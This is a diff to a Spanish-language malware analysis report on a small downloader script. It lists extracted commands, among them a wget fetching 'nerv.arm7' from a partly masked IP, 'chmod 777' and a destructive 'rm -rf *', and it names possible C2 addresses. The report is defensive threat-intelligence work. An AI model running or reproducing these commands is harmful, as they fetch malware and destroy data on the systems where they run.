@@ -4,7 +4,15 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 440 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `nerv.arm7` en `hxxp://93.115.101.XXX:13734/nerv.arm7`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 440 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `nerv.arm7` en `hxxp://93.115.101.XXX:13734/nerv.arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `chmod 777 nerv.arm7`
+2. `rm -rf *`
+3. `rm nerv.arm7`
+4. `wget http:/\/hxxp://93.115.101.XXX:13734/nerv.arm7` **C2 / infraestructura de control:**
+
+- **Posible C2:** `190.179.140.XXX` — confianza Alto, evidencia hardcoded_in_payload
+- **Posible C2:** `93.115.101.XXX` — confianza Descartado, evidencia hardcoded_in_payload Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f.md](../../../../../malware-like/oraculo/downloader/1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f.md)
 
 
 ## 🏷️ Clasificación
